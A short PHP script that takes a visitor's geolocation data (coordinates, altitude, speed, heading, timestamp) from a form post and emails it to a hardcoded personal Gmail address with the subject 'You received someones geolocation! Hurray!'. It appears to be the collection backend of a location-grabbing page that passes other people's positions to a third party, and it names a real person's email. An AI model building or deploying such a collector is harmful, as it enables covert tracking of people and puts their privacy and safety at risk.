<?php

$latitude = $_POST["latitude"];
$longitude = $_POST["longitude"];
$accuracy = $_POST["accuracy"];
$altitude = $_POST["altitude"];
$altitudeaccuracy = $_POST["altitudeaccuracy"];
$speed = $_POST["speed"];
$heading = $_POST["heading"];
$timestamp = $_POST["timestamp"];

echo "a";

mail("samuelvandak@gmail.com","You received someones geolocation! Hurray!","The latitude is: $latitude
\n The longitude is $longitude
\n The accuracy of your query is $accuracy
\n The altitude is $altitude
\n The altitude accuracy of your query is $altitudeaccuracy
\n The speed is $speed
\n The heading is $heading
\n The timestamp is $timestamp
"
);
?>
